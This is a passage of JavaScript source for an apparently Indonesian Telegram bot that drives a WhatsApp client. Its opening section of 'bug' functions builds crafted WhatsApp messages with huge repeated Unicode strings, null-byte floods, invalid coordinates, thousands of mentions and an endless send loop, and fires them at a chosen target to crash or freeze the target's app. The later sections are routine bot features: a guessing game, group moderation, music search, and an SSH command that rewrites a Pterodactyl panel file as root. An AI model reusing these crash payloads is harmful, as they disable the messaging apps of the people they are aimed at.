    const metaNode = [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target } }]
      }]
    }];

    const locationMessage = {
      degreesLatitude: -9.09999262999,
      degreesLongitude: 199.99963118999,
      jpegThumbnail: null,
      name: "\u0000" + Node.repeat(15000),
      address: "\u0000" + Node.repeat(10000),
      url: `${Node.repeat(25000)}.com`
    };

    const extendMsg = {
      extendedTextMessage: {
        text: "X",
        matchedText: "",
        description: Node.repeat(25000),
        title: Node.repeat(15000),
        previewType: "NONE",
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/OLEoNAWOTCTFRfHQNAMYmMjIUEgAcmFqKiw0xFH//Z",
        thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc",
        thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
        thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
        mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
        mediaKeyTimestamp: "1743101489",
        thumbnailHeight: 641,
        thumbnailWidth: 640,
        inviteLinkGroupTypeV2: "DEFAULT"
      }
    };

    const makeMsg = content =>
      generateWAMessageFromContent(
        target,
        { viewOnceMessage: { message: content } },
        {}
      );

    const msg1 = makeMsg({ locationMessage });
    const msg2 = makeMsg(extendMsg);
    const msg3 = makeMsg({ locationMessage });

    for (const m of [msg1, msg2, msg3]) {
      await sock.relayMessage("status@broadcast", m.message, {
        messageId: m.key.id,
        statusJidList: [target],
        additionalNodes: metaNode
      });
    }

  } catch (e) {
    console.error(e);
  }
}

async function ZhTVlood(sock, target) {
  await sock.relayMessage(
    target,
    {
      viewOnceMessage: {
        message: {
          groupInviteMessage: {
            groupJid: "1887967@g.us",
            inviteCode: "ꦽ".repeat(100000),
            inviteExpiration: "99999999999",
            groupName: "ZhT" + "ꦾ".repeat(100000),
            caption: "https://t.me/Linzzkece",
            body: {
              text: "ꦾ".repeat(10000),
            },
            newsletterAdminInviteMessage: {
              newsletterJid: "120363370508049655@newsletter",
              newsletterName: "ꦾ".repeat(980000),
              caption: "ꦽ".repeat(590000),
              inviteExpiration: "909092899",
            },
          },
        },
      },
    },
    {
      messageId: null,
      participant: { jid: target },
    }
  );
}

async function ZhTDemon(sock, target) {
    const ZhT = {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "ZhT",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\u0000".repeat(1000000),
                        version: 3
                    }
                }
            }
        }
    };

    for (let i = 0; i < 75; i++) {
        const payload = generateWAMessageFromContent(target, ZhT);
        
        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: payload.message
            }
        }, { 
            messageId: payload.key.id, 
            participant: { jid: target } 
        });
        
        await sleep(1000);
    }

    await sock.relayMessage(target, ZhT, { 
        participant: { jid: target } 
    });

    console.log(chalk.red(`Succes Send Bug To Target ${target} ZhT`));
}

async function ZxD(target) {
  for (let i = 0; i < 100; i++) {

    const fc = {
      locationMessage: {
        degreesLatitude: 91,
        degreesLongitude: 181,
      }
    }

    await sock.relayMessage(target, fc, { });

  }
}

async function HardCore(sock, target) {
  let msg = {
    ephemeralMessage: {
      message: {
        interactiveMessage: {
          header: { title: "ꦾ".repeat(8000) },
          body: { text: "ꦽ".repeat(8000) },
          contextInfo: {
            stanzaId: "Sejaya_id",
            isForwarding: true,
            forwardingScore: 999,
            participant: target,
            remoteJid: "status@broadcast",
            mentionedJid: ["13333335502@s.whatsapp.net", ...Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 5000000) + "13333335502@s.whatsapp.net")],
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimeStamp: Date.now() + 18144000000,
              },
            },
            forwardedAiBotMessageInfo: {
              botName: "BOKEP SIMULATOR",
              botJid: Math.floor(Math.random() * 99999),
              creatorName: "https://t.me/LeamorZunn",
            }
          }
        }
      }
    }
  };

  await sock.relayMessage(target, msg, {
    participant: { jid: target }
  });

  console.log("Hard Invisible Delay");
} 

async function amountOne(target) {
  const Null = {
    requestPaymentMessage: {
      amount: {
       value: 1,
       offset: 0,
       currencyCodeIso4217: "IDR",
       requestFrom: target,
       expiryTimestamp: Date.now()
      },
      contextInfo: {
        externalAdReply: {
          title: null,
          body: "X".repeat(1500),
          mimetype: "audio/mpeg",
          caption: "X".repeat(1500),
          showAdAttribution: true,
          sourceUrl: null,
          thumbnailUrl: null
        }
      }
    }
  };
    
    let Payment = {
    interactiveMessage: {
      header: {
        title: "Null",
        subtitle: "ꦾ".repeat(10000),
        hasMediaAttachment: false
      },
      body: {
        text: "ꦾ".repeat(20000)
      },
      footer: {
        text: "ꦾ".repeat(20000)
      },
      nativeFlowMessage: {
        buttons: [
          {
            name: "single_select",
            buttonParamsJson: JSON.stringify({
              title: "ꦾ".repeat(20000),
              sections: [
                {
                  title: "ꦾ".repeat(5000),
                  rows: [
                    { 
                      title: "ꦾ".repeat(5000), 
                      description: "ꦾ".repeat(5000), 
                      id: "ꦾ".repeat(2000) 
                    },
                    { 
                      title: "ꦾ".repeat(5000), 
                      description: "ꦾ".repeat(5000), 
                      id: "ꦾ".repeat(2000) 
                    },
                    { 
                      title: "ꦾ".repeat(5000), 
                      description: "ꦾ".repeat(5000), 
                      id: "ꦾ".repeat(2000) 
                    }
                  ]
                },
                {
                  title: "ꦾ".repeat(20000) + "bokep simulator",
                  rows: [
                    { 
                      title: "ꦾ".repeat(5000), 
                      description: "ꦾ".repeat(5000), 
                      id: "ꦾ".repeat(2000) 
                    },
                    { 
                      title: "Null", 
                      description: "\u0000".repeat(5000), 
                      id: "ꦾ".repeat(2000) 
                    }
                  ]
                }
              ]
            })
          }
        ]
      }
    }
  };
  
  
  await sock.relayMessage(target, Null, Payment, {
    participant: { jid: target },
    messageId: null,
    userJid: target,
    quoted: null
  });
}

async function R9X(sock, target, mention) {
  var R9X = {
    locationMessage: {
      degreesLatitude: 90.0,
      name: "R9X"
    }
  };

  await sock.relayMessage(
    target,
    R9X,
    mention
      ? { participant: { jid: target } }
      : {}
  );
}

async function R9X(sock, target, mention) {
  while (true) {
    var R9X = generateWAMessageFromContent(target, {
      interactiveResponseMessage: {
        contextInfo: {
          mentionedJid: Array.from(
            { length: 2000 },
            (_, r) => `6285983729${r + 1}@s.whatsapp.net`
          )
        },
        body: {
          text: "R9X",
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "galaxy_message",
          paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900000)}\"}}`,
          version: 3
        }
      }
    }, {});

    await sock.relayMessage(
      target,
      {
        groupStatusMessageV2: {
          message: R9X.message
        }
      },
      mention
        ? { messageId: R9X.key.id, participant: { jid: target } }
        : { messageId: R9X.key.id }
    );
  }

  console.log(chalk.red(`Succes Sending Bug By Rizz To ${target}`));
}

async function R9XNewsletter2(sock, target, mention) {
  await sock.relayMessage(
    target,
    {
      groupStatusMentionMessage: {
        message: {
          protocolMessage: {
            key: {
              participant: "131355550002@s.whatsapp.net",
              remoteJid: "status@broadcast"
            },
            type: "STATUS_MENTION_MESSAGE"
          }
        }
      }
    },
    mention
      ? {
          userJid: target
        }
      : {}
  )
}
//ENDD FUNCTION BUG//

//TOOLS PERMAINAN VLOID INVICTUS//
// ==================== 🎮 GAME TEBAK ANGKA ====================

// Fungsi untuk menghasilkan angka acak
function generateRandomNumber(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

let activeGames = {};

// Command untuk memulai game
bot.command("game", checkPremium, checkCooldown, async (ctx) => {
    const userId = ctx.from.id;
    
    // Cek apakah user sedang bermain game
    if (activeGames[userId]) {
        return ctx.reply("🎮 Kamu masih dalam permainan! Gunakan /tebak <angka> untuk menebak\nAtau /endgame untuk mengakhiri");
    }
    
    // Inisialisasi game baru
    activeGames[userId] = {
        angkaRahasia: generateRandomNumber(1, 100),
        kesempatan: 10,
        skor: 0,
        mulai: Date.now()
    };
    
    const gameInfo = `
🎮 *GAME TEBAK ANGKA*
━━━━━━━━━━━━━━━━━━━
• Tebak angka antara 1 - 100
• Kamu punya 10 kesempatan
• Semakin cepat tebak, skor semakin tinggi!

📝 *Perintah:*
/tebak <angka> - Untuk menebak angka
/hint - Untuk mendapatkan petunjuk
/endgame - Akhiri permainan

Selamat bermain! 🎯
    `;
    
    await ctx.reply(gameInfo, { parse_mode: "Markdown" });
});

// Command untuk menebak angka
bot.command("tebak", checkPremium, async (ctx) => {
    const userId = ctx.from.id;
    const args = ctx.message.text.split(" ");
    
    // Cek apakah ada game aktif
    if (!activeGames[userId]) {
        return ctx.reply("🎮 Kamu belum memulai game! Gunakan /game untuk memulai");
    }
    
    // Validasi input
    if (args.length < 2) {
        return ctx.reply("📝 Format: /tebak <angka>\nContoh: /tebak 50");
    }
    
    const tebakan = parseInt(args[1]);
    if (isNaN(tebakan) || tebakan < 1 || tebakan > 100) {
        return ctx.reply("❌ Masukkan angka antara 1-100!");
    }
    
    const game = activeGames[userId];
    game.kesempatan--;
    
    // Logika game
    if (tebakan === game.angkaRahasia) {
        // Hitung skor berdasarkan waktu dan kesempatan tersisa
        const waktuMain = Math.floor((Date.now() - game.mulai) / 1000);
        const bonusWaktu = Math.max(300 - waktuMain, 0); // Bonus semakin cepat
        const bonusKesempatan = game.kesempatan * 10;
        const totalSkor = 100 + bonusWaktu + bonusKesempatan;
        
        // Update skor
        game.skor = totalSkor;
        
        // Kirim hasil kemenangan
        const winMessage = `
🎉 *SELAMAT! TEBAKANMU BENAR!*
━━━━━━━━━━━━━━━━━━━
• Angka rahasia: *${game.angkaRahasia}*
• Sisa kesempatan: ${game.kesempatan}
• Waktu: ${waktuMain} detik
• 🏆 SKOR: *${totalSkor}*

*Detail Bonus:*
✓ Base: 100 poin
✓ Bonus waktu: ${bonusWaktu} poin
✓ Bonus kesempatan: ${bonusKesempatan} poin

🔥 *Skor tertinggi akan diumumkan!*
        `;
        
        await ctx.reply(winMessage, { parse_mode: "Markdown" });
        
        // Simpan skor ke file (jika ada fitur leaderboard)
        saveHighScore(userId, ctx.from.first_name, totalSkor);
        
        // Hapus game
        delete activeGames[userId];
        
    } else {
        // Tebakan salah
        const pesan = tebakan < game.angkaRahasia ? "TERLALU RENDAH 📉" : "TERLALU TINGGI 📈";
        
        const gameStatus = `
🎯 *Tebakan: ${tebakan}*
${pesan}
━━━━━━━━━━━━━━━━━━━
• Sisa kesempatan: *${game.kesempatan}*
• Petunjuk: ${getHint(game.angkaRahasia, tebakan)}

${game.kesempatan > 0 ? "Coba lagi! 💪" : "❌ KESEMPATAN HABIS!"}
        `;
        
        await ctx.reply(gameStatus, { parse_mode: "Markdown" });
        
        // Jika kesempatan habis
        if (game.kesempatan <= 0) {
            const loseMessage = `
😔 *GAME OVER!*
━━━━━━━━━━━━━━━━━━━
• Angka rahasia: *${game.angkaRahasia}*
• Skor akhir: ${game.skor}

Gunakan /game untuk bermain lagi!
            `;
            
            await ctx.reply(loseMessage, { parse_mode: "Markdown" });
            delete activeGames[userId];
        }
    }
});

// Command untuk hint
bot.command("hint", checkPremium, async (ctx) => {
    const userId = ctx.from.id;
    
    if (!activeGames[userId]) {
        return ctx.reply("🎮 Kamu belum memulai game!");
    }
    
    const game = activeGames[userId];
    const hints = [
        `Angkanya ${game.angkaRahasia % 2 === 0 ? 'genap' : 'ganjil'}`,
        `Angkanya lebih dari ${Math.floor(game.angkaRahasia / 2)}`,
        `Angkanya kurang dari ${game.angkaRahasia + 20}`,
        `Digit terakhirnya adalah ${game.angkaRahasia % 10}`
    ];
    
    const randomHint = hints[Math.floor(Math.random() * hints.length)];
    
    await ctx.reply(`💡 *PETUNJUK:* ${randomHint}\n\n(Kesempatan berkurang 1)`, { parse_mode: "Markdown" });
    game.kesempatan = Math.max(game.kesempatan - 1, 0);
});

// Command untuk mengakhiri game
bot.command("endgame", async (ctx) => {
    const userId = ctx.from.id;
    
    if (!activeGames[userId]) {
        return ctx.reply("🎮 Kamu tidak sedang bermain!");
    }
    
    const game = activeGames[userId];
    const revealedMessage = `
🛑 *PERMAINAN DIHENTIKAN*
━━━━━━━━━━━━━━━━━━━
• Angka rahasia: *${game.angkaRahasia}*
• Sisa kesempatan: ${game.kesempatan}
• Skor: ${game.skor}

Gunakan /game untuk bermain lagi!
    `;
    
    await ctx.reply(revealedMessage, { parse_mode: "Markdown" });
    delete activeGames[userId];
});

// Command leaderboard
bot.command("leaderboard", async (ctx) => {
    try {
        const scores = loadHighScores();
        if (scores.length === 0) {
            return ctx.reply("📊 Belum ada skor tertinggi! Mainkan dulu dengan /game");
        }
        
        let leaderboardText = "🏆 *LEADERBOARD TEBAK ANGKA*\n━━━━━━━━━━━━━━━━━━━\n\n";
        
        scores.slice(0, 10).forEach((score, index) => {
            leaderboardText += `${index + 1}. ${score.name} - *${score.score}* poin\n`;
        });
        
        leaderboardText += `\nTotal pemain: ${scores.length}`;
        
        await ctx.reply(leaderboardText, { parse_mode: "Markdown" });
    } catch (error) {
        await ctx.reply("📊 Leaderboard masih kosong! Mainkan dulu dengan /game");
    }
});

// ==================== FUNGSI BANTUAN ====================

// Fungsi untuk mendapatkan petunjuk
function getHint(targetNumber, guess) {
    const diff = Math.abs(targetNumber - guess);
    
    if (diff > 50) return "Jauh sekali!";
    if (diff > 30) return "Masih jauh!";
    if (diff > 15) return "Mendekati!";
    if (diff > 5) return "Sudah dekat!";
    return "Sangat dekat!";
}

// Fungsi untuk menyimpan skor tinggi
function saveHighScore(userId, name, score) {
    try {
        const scoreFile = './database/highscores.json';
        let scores = [];
        
        // Load existing scores
        if (fs.existsSync(scoreFile)) {
            const data = fs.readFileSync(scoreFile);
            scores = JSON.parse(data);
        }
        
        // Add new score
        scores.push({
            id: userId,
            name: name,
            score: score,
            date: moment().tz('Asia/Jakarta').format('DD-MM-YYYY HH:mm:ss')
        });
        
        // Sort by score (descending)
        scores.sort((a, b) => b.score - a.score);
        
        // Keep only top 100 scores
        if (scores.length > 100) {
            scores = scores.slice(0, 100);
        }
        
        // Save to file
        fs.writeFileSync(scoreFile, JSON.stringify(scores, null, 2));
    } catch (error) {
        console.error("Error saving high score:", error);
    }
}

// Fungsi untuk load skor tinggi
function loadHighScores() {
    try {
        const scoreFile = './database/highscores.json';
        if (!fs.existsSync(scoreFile)) return [];
        
        const data = fs.readFileSync(scoreFile);
        return JSON.parse(data);
    } catch (error) {
        return [];
    }
}

// ==================== TAMBAHKAN KE MENU ====================

// Tambahkan button game ke menu utama (modify bot.action('/start') atau tambah di callback)
bot.action('/game_menu', async (ctx) => {
    const gameMenu = `
🎮 *GAME TEBAK ANGKA MENU*
━━━━━━━━━━━━━━━━━━━
Pilih game yang ingin dimainkan:

1️⃣ Tebak Angka
   /game - Mulai permainan
   /tebak <angka> - Tebak angka
   /hint - Dapatkan petunjuk
   /leaderboard - Lihat ranking

2️⃣ Fitur Tambahan
   /endgame - Akhiri permainan

*Hanya untuk user premium!*
    `;
    
    const keyboard = [
        [
            { text: "🎮 Mulai Game", callback_data: "/start_game" }
        ],
        [
            { text: "🏆 Leaderboard", callback_data: "/show_leaderboard" },
            { text: "🔙 Back", callback_data: "/start" }
        ]
    ];
    
    try {
        await ctx.editMessageCaption(gameMenu, {
            parse_mode: "Markdown",
            reply_markup: { inline_keyboard: keyboard }
        });
    } catch (error) {
        await ctx.answerCbQuery();
    }
});

// Callback untuk mulai game
bot.action('/start_game', async (ctx) => {
    await ctx.answerCbQuery("Game akan dimulai...");
    // Trigger command game
    bot.telegram.sendMessage(ctx.chat.id, "/game");
});

// Callback untuk leaderboard
bot.action('/show_leaderboard', async (ctx) => {
    await ctx.answerCbQuery("Memuat leaderboard...");
    // Trigger command leaderboard
    bot.telegram.sendMessage(ctx.chat.id, "/leaderboard");
});

const { Client } = require("ssh2");

bot.command("installprotect", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text || !text.includes("|")) {
    return ctx.reply(
`❌ FORMAT SALAH

Gunakan:
 /installProtect ipvps|password

Contoh:
 /installProtect 192.168.1.10|root123

⚠️ SYARAT:
- VPS Ubuntu
- Pterodactyl sudah terinstall
- Login root`
    );
  }

  const [ip, password] = text.split("|").map(v => v.trim());
  const ssh = new Client();

  await ctx.reply(`🔐 Menghubungkan ke VPS ${ip}...`);

  ssh.on("ready", () => {
    ctx.reply("✅ SSH Connected\n🛡 Installing Anti-Spy Protect...");

    const command = `
REMOTE_PATH="/var/www/pterodactyl/app/Http/Controllers/Server/ServerController.php"
TIMESTAMP=$(date -u +"%Y-%m-%d-%H-%M-%S")
BACKUP_PATH="$REMOTE_PATH.bak_$TIMESTAMP"

if [ ! -d "/var/www/pterodactyl" ]; then
  echo "❌ Pterodactyl tidak ditemukan"
  exit 1
fi

if [ -f "$REMOTE_PATH" ]; then
  mv "$REMOTE_PATH" "$BACKUP_PATH"
  echo "📦 Backup: $BACKUP_PATH"
fi

cat > "$REMOTE_PATH" << 'EOF'
<?php

namespace Pterodactyl\Http\Controllers\Server;

use Illuminate\Support\Facades\Auth;
use Pterodactyl\Models\Server;
use Pterodactyl\Http\Controllers\Controller;
use Pterodactyl\Repositories\Eloquent\ServerRepository;

class ServerController extends Controller
{
    public function __construct(private ServerRepository $repository)
    {
    }

    public function index(Server $server)
    {
        $user = Auth::user();

        if ($user->id !== 1) {
            $ownerId = $server->owner_id
                ?? $server->user_id
                ?? ($server->owner?->id ?? null)
                ?? ($server->user?->id ?? null);

            if ($ownerId === null || $ownerId !== $user->id) {
                abort(403, 'Akses ditolak: server ini dilindungi.');
            }
        }

        return view('server.index', [
            'server' => $server,
        ]);
    }
}
EOF

chmod 644 "$REMOTE_PATH"

cd /var/www/pterodactyl
php artisan optimize:clear
php artisan view:clear
php artisan cache:clear

systemctl restart pteroq || true
systemctl restart nginx || systemctl restart apache2 || true

echo "✅ Anti-Spy Protect Installed"
`;

    ssh.exec(command, (err, stream) => {
      if (err) {
        ctx.reply("❌ Gagal menjalankan command.");
        ssh.end();
        return;
      }

      let output = "";
      stream.on("data", data => output += data.toString());
      stream.on("close", () => {
        ctx.reply(
`🛡 **ANTI-SPY INSTALLATION RESULT**

🌐 VPS: ${ip}
📄 Path: ServerController.php
📦 Backup: dibuat otomatis
🔒 Akses server: OWNER ONLY
👑 Admin utama (ID 1): bypass

📜 Log:
${output}

✅ INSTALL SELESAI`
        );
        ssh.end();
      });
    });
  });

  ssh.on("error", () => {
    ctx.reply("❌ SSH gagal. IP / Password salah atau SSH mati.");
  });

  ssh.connect({
    host: ip,
    port: 22,
    username: "root",
    password
  });
});

// Simpan kata
const badWords = {};

// CMD /setwarn <kata>
bot.command("setwarn", async (ctx) => {
  if (!ctx.chat || ctx.chat.type === "private") return;

  const member = await ctx.getChatMember(ctx.from.id);
  if (member.status !== "administrator" && member.status !== "creator") {
    return ctx.reply("❌ Hanya admin yang bisa set kata terlarang");
  }

  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) {
    return ctx.reply("❌ Contoh:\n/setwarn kontol");
  }

  const chatId = ctx.chat.id;
  if (!badWords[chatId]) badWords[chatId] = [];

  badWords[chatId].push(text.toLowerCase());

  ctx.reply(`🚫 Kata terlarang ditambahkan:\n"${text}"`);
});

async function getTargetUser(ctx) {
  // 1. Dari reply
  if (ctx.message.reply_to_message) {
    return ctx.message.reply_to_message.from
  }

  const args = ctx.message.text.split(" ").slice(1)

  // 2. Dari ID
  if (args[0] && /^\d+$/.test(args[0])) {
    return { id: Number(args[0]) }
  }

  // 3. Dari @username
  if (args[0] && args[0].startsWith("@")) {
    const username = args[0].replace("@", "")
    const admins = await ctx.getChatAdministrators()
    const found = admins.find(
      (a) => a.user.username && a.user.username.toLowerCase() === username.toLowerCase()
    )
    if (found) return found.user
  }

  return null
}

function parseDuration(text) {
  if (!text) return 10 * 60 // default 10 menit

  const match = text.match(/^(\d+)(s|m|h|d)$/)
  if (!match) return null

  const value = parseInt(match[1])
  const unit = match[2]

  switch (unit) {
    case 's': return value
    case 'm': return value * 60
    case 'h': return value * 60 * 60
    case 'd': return value * 60 * 60 * 24
    default: return null
  }
}
//----------(SETGOODBYE USERRRRR)---------//
bot.command("setgoodbye", async (ctx) => {
  if (!ctx.chat || ctx.chat.type === "private") return

  if (!isAdmin(ctx.from.id))
    return ctx.reply("❌ Kamu bukan admin bot.")

  const text = ctx.message.text.split(" ").slice(1).join(" ")
  if (!text)
    return ctx.reply(
      "⚠️ Gunakan:\n/setgoodbye Selamat tinggal {user} dari {group}"
    )

  goodbyeMessage.set(ctx.chat.id, text)
  ctx.reply("✅ Goodbye message berhasil diset.")
})
//----------(SETWELCOME USERRRRR)---------//
bot.command("setwelcome", async (ctx) => {
  if (!ctx.chat || ctx.chat.type === "private") return

  if (!isAdmin(ctx.from.id))
    return ctx.reply("❌ Kamu bukan admin bot.")

  const text = ctx.message.text.split(" ").slice(1).join(" ")
  if (!text)
    return ctx.reply(
      "⚠️ Gunakan:\n/setwelcome Selamat datang {user} di {group}"
    )

  welcomeMessage.set(ctx.chat.id, text)
  ctx.reply("✅ Welcome message berhasil diset.")
})
//----------(KICK USERRRRR)---------//
bot.command("kick", async (ctx) => {
  try {
    if (!ctx.chat || ctx.chat.type === "private") return
    if (!isAdmin(ctx.from.id))
      return ctx.reply("❌ Kamu bukan admin bot.")

    const target = await getTargetUser(ctx)
    if (!target || !target.id)
      return ctx.reply("⚠️ Reply user / tag @user / isi user ID.")

    if (target.is_bot)
      return ctx.reply("❌ Tidak bisa kick bot.")

    // kick = ban lalu unban (agar bisa join lagi)
    await ctx.telegram.banChatMember(ctx.chat.id, target.id)
    await ctx.telegram.unbanChatMember(ctx.chat.id, target.id)

    ctx.reply(
`👢 *USER DI-KICK*
🆔 ID: ${target.id}`,
      { parse_mode: "Markdown" }
    )
  } catch (e) {
    console.error(e)
    ctx.reply("❌ Gagal kick user.")
  }
})
//----------(MUTEE USERRRRR)---------//
bot.command("mute", async (ctx) => {
  try {
    if (!ctx.chat || ctx.chat.type === "private") return
    if (!isAdmin(ctx.from.id))
      return ctx.reply("❌ Kamu bukan admin bot.")

    const target = await getTargetUser(ctx)
    if (!target || !target.id)
      return ctx.reply("⚠️ Reply user / tag @user / isi user ID.")

    if (target.is_bot)
      return ctx.reply("❌ Tidak bisa mute bot.")

    const args = ctx.message.text.split(" ").slice(1)
    const durationText = args.find(a => /^[0-9]+[smhd]$/.test(a))
    const duration = parseDuration(durationText)

    if (duration === null)
      return ctx.reply("❌ Format waktu salah.\nContoh: 10m, 1h, 1d")

    const until = Math.floor(Date.now() / 1000) + duration

    await ctx.telegram.restrictChatMember(ctx.chat.id, target.id, {
      permissions: {
        can_send_messages: false,
        can_send_media_messages: false,
        can_send_polls: false,
        can_send_other_messages: false,
        can_add_web_page_previews: false
      },
      until_date: until
    })

    ctx.reply(
`🔇 *USER DI-MUTE*
👤 ${target.first_name || "-"}
🆔 ID: ${target.id}
⏱ Durasi: ${durationText || "10m"}`,
      { parse_mode: "Markdown" }
    )

  } catch (e) {
    console.error(e)
    ctx.reply("❌ Gagal mute user.")
  }
})
//----------(UNMUTEE USERRRRR)---------//
bot.command("unmute", async (ctx) => {
  try {
    if (!ctx.chat || ctx.chat.type === "private") return
    if (!isAdmin(ctx.from.id))
      return ctx.reply("❌ Kamu bukan admin bot.")

    const target = await getTargetUser(ctx)
    if (!target || !target.id)
      return ctx.reply("⚠️ Reply user / tag @user / isi user ID.")

    await ctx.telegram.restrictChatMember(ctx.chat.id, target.id, {
      permissions: {
        can_send_messages: true,
        can_send_media_messages: true,
        can_send_polls: true,
        can_send_other_messages: true,
        can_add_web_page_previews: true
      }
    })

    ctx.reply(
`🔊 *USER DI-UNMUTE*
🆔 ID: ${target.id}`,
      { parse_mode: "Markdown" }
    )
  } catch (e) {
    console.error(e)
    ctx.reply("❌ Gagal unmute user.")
  }
})
//----------(BAND USERRRRR)---------//
bot.command("ban", async (ctx) => {
  try {
    if (!ctx.chat || ctx.chat.type === "private") return

    if (!isAdmin(ctx.from.id))
      return ctx.reply("❌ Kamu bukan admin bot.")

    const target = await getTargetUser(ctx)
    if (!target || !target.id)
      return ctx.reply("⚠️ Reply user / tag @user / isi user ID.")

    if (target.is_bot)
      return ctx.reply("❌ Tidak bisa ban bot.")

    await ctx.telegram.banChatMember(ctx.chat.id, target.id)

    ctx.reply(
`⛔ *USER DIBANNED*
🆔 ID: ${target.id}
👤 ${target.first_name || "-"}`,
      { parse_mode: "Markdown" }
    )
  } catch (e) {
    console.error(e)
    ctx.reply("❌ Gagal ban user.")
  }
})
//----------(UNBANDD USERR)---------//
bot.command("unban", async (ctx) => {
  try {
    if (!ctx.chat || ctx.chat.type === "private") return

    if (!isAdmin(ctx.from.id))
      return ctx.reply("❌ Kamu bukan admin bot.")

    const target = await getTargetUser(ctx)
    if (!target || !target.id)
      return ctx.reply("⚠️ Reply user / tag @user / isi user ID.")

    await ctx.telegram.unbanChatMember(ctx.chat.id, target.id)

    ctx.reply(
`✅ *USER DI-UNBAN*
🆔 ID: ${target.id}`,
      { parse_mode: "Markdown" }
    )
  } catch (e) {
    console.error(e)
    ctx.reply("❌ Gagal unban user.")
  }
})

const ytsr = require('ytsr')

bot.command(["music", "playmusic"], async (ctx) => {
  try {
    const query = ctx.message.text.split(" ").slice(1).join(" ")
    if (!query)
      return ctx.reply("🎵 Gunakan:\n/music judul lagu")

    ctx.reply("🔍 Mencari lagu...")

    const url = `https://itunes.apple.com/search?term=${encodeURIComponent(
      query
    )}&entity=song&limit=5`

    const res = await axios.get(url)
    const results = res.data.results

    if (!results || results.length === 0)
      return ctx.reply("❌ Lagu tidak ditemukan.")

    for (const song of results) {
      const caption =
`🎶 *${song.trackName}*
👤 ${song.artistName}
💿 ${song.collectionName}`

      if (song.previewUrl) {
        await ctx.replyWithAudio(
          { url: song.previewUrl },
          { caption, parse_mode: "Markdown" }
        )
      } else {
        await ctx.reply(caption, { parse_mode: "Markdown" })
      }
    }

  } catch (err) {
    console.error(err)
    ctx.reply("❌ Gagal mencari lagu.")
  }
})
// =======================
// /playmusic COMMAND
// =======================
bot.command(['playmusic', 'play'], async (ctx) => {
  try {
    const query = ctx.message.text.split(' ').slice(1).join(' ')
    if (!query)
      return ctx.reply('🎵 Gunakan:\n/playmusic judul lagu')

    ctx.reply('🔍 Mencari lagu...')

    const result = await ytsr(query, { limit: 5 })
    const videos = result.items.filter(v => v.type === 'video')

    if (videos.length === 0)
      return ctx.reply('❌ Lagu tidak ditemukan.')

    let msg = `🎶 *Hasil Pencarian:*\n\n`
    videos.forEach((v, i) => {
      msg += `${i + 1}. *${v.title}*\n`
      msg += `⏱ ${v.duration}\n`
      msg += `🔗 ${v.url}\n\n`
    })

    ctx.reply(msg, { parse_mode: 'Markdown' })

  } catch (err) {
    console.error(err)
    ctx.reply('❌ Terjadi kesalahan saat mencari lagu.')
  }
})
// ===== ANTI LINK =====
const antiLink = new Map()
const link = /(https?:\/\/|t\.me\/|telegram\.me\/|wa\.me\/)/i

// COMMAND /antilink on|off
bot.command("antilink", async (ctx) => {
  if (!ctx.chat || ctx.chat.type === "private") return;

  if (!isAdmin(ctx.from.id))
    return ctx.reply("❌ Kamu bukan admin bot.");

  const arg = ctx.message.text.split(" ")[1];

  if (arg === "on") {
    antiLink.set(ctx.chat.id, true);
    return ctx.reply("Feature Group Anti Link Berhasil Di Aktifkan ✅");
  }

  if (arg === "off") {
    antiLink.set(ctx.chat.id, false);
    return ctx.reply("❌ AntiLink mati");
  }

  ctx.reply("Gunakan: /antilink on | off");
});

//CASE TUTUP BUKA GROUP//
bot.command("lock", async (ctx) => {
  if (!ctx.chat || ctx.chat.type === "private") return;

  if (!isAdmin(ctx.from.id))
    return ctx.reply("❌ Kamu bukan admin bot.");

  await ctx.telegram.setChatPermissions(ctx.chat.id, {
    can_send_messages: false,
    can_send_media_messages: false,
    can_send_polls: false,
    can_send_other_messages: false,
    can_add_web_page_previews: false
  });

  ctx.reply("🔒 *GROUP TELAH DI KUNCI, MEMBER BIASA TIDAK BISA MENGAKSES CHEATING GROUP*", { parse_mode: "Markdown" });
});

// ================= UNLOCK =================
bot.command("unlock", async (ctx) => {
  if (!ctx.chat || ctx.chat.type === "private") return;

  if (!isAdmin(ctx.from.id))
    return ctx.reply("❌ Kamu bukan admin bot.");

  await ctx.telegram.setChatPermissions(ctx.chat.id, {
    can_send_messages: true,
    can_send_media_messages: true,
    can_send_polls: true,
    can_send_other_messages: true,
    can_add_web_page_previews: true
  });

  ctx.reply("🔓 *GROUP TELAH DI BUKA, MEMBER BIASA BISA MENGAKSES CHEATING GROUP*", { parse_mode: "Markdown" });
});
//AUTO GOODBAYE//
bot.on("left_chat_member", (ctx) => {
  const chatId = ctx.chat.id
  const goodbye = goodbyeMessage.get(chatId)
  if (!goodbye) return

  const user = ctx.message.left_chat_member

  const msg = goodbye
    .replace(/{user}/gi, user.first_name)
    .replace(/{group}/gi, ctx.chat.title)

  ctx.reply(msg)
})
//AUTO WELCOME//
bot.on("new_chat_members", (ctx) => {
  const chatId = ctx.chat.id
  const welcome = welcomeMessage.get(chatId)
  if (!welcome) return

  ctx.message.new_chat_members.forEach((user) => {
    const msg = welcome
      .replace(/{user}/gi, user.first_name)
      .replace(/{group}/gi, ctx.chat.title)

    ctx.reply(msg)
  })
})
// AUTO DELETE LINK
bot.on('text', async (ctx) => {
    if (!ctx.chat || ctx.chat.type === 'private') return
    if (!antiLink.get(ctx.chat.id)) return
